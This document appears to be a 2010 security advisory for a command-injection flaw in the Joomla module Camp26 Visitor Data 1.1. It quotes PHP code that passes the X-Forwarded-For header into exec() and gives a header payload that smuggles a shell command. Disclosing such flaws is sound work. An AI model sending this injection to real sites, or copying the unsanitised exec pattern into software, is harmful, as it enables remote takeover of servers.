@@ -1,0 +1,68 @@
+Joomla Module Camp26 Visitor Data 1.1 Remote code Execution
+============================================================
+
+- Discovered by	: Chip D3 Bi0s
+- Email		: chipdebios@gmail.com
+- Date		: 2010-04-28
+- Severity	: 9/10 (CVSS scored)
+
+-------------------------------
+
+Module Camp26 Visitor Data For Joomla 1.5.x
+Version		: 1.1
+Type		: Non-Commercial
+Created by	: Denny Setiarika Pirhadi - camp26.biz Team
+License 	: GPLv2.0 - http://www.gnu.org/licenses/gpl-2.0.html
+Created on	: 02 May 2008
+Latest Update	: 26 December 2008
+URL		: www.camp26.biz
+
+I. BACKGROUND
+Visitor Data Module shows the visitor's data on your live site (Their IP, Proxy(if used),
+Country, ISP, Browser, Operating System).
+Based on GeoIP (www.maxmind.com).
+
+II. DESCRIPTION
+Some technical issues were originally published in the following post:
+http://elotrolad0.blogspot.com/2010/05/modvisitordata-joomla-remoce-code.html
+
+with whom originally exploit the error, as r0i like to thank, who Realizing the
+proof of concept.
+
+
+III. ANALYSIS
+The bug is in the following files, specifying the lines
+
+file:
+/modules/mod_VisitorData/tmpl/default.php
+
+line:
+[47] if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+[48] 		$whois ="whois " . $_SERVER['HTTP_X_FORWARDED_FOR'] ." | grep netname";
+[49] 	}
+[50] 	else{
+[51] 		$whois ="whois " . $_SERVER['REMOTE_ADDR'] ." | grep netname";
+[52] 	}
+[53] 
+[54] 	$isp_user = exec($whois);
+
+
+explaining the code: what to do is get our ip, and if it passes through any proxy other
+than q are also other issues in the code as the country of connection, image, browser,
+operating system. As can be seen to see if it goes through a proxy using the exec (),
+line 54, reason that allows you to run remote commands.
+If the conditional check whether to park in the header HTTP_X_FORWARDED_FOR,if this
+happens take this value otherwise take REMOTE_ADDR, 2 may be present at one time.
+
+command to run only can we add X-Forwarded-For in the header to take this value and
+run exec () which is what we are interested.
+
+IV. EXPLOITATION
+You have to add
+X-Forwarded-For:;[command-here];1
+
+
++++++++++++++++++++++++++++++++++++++++
+[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
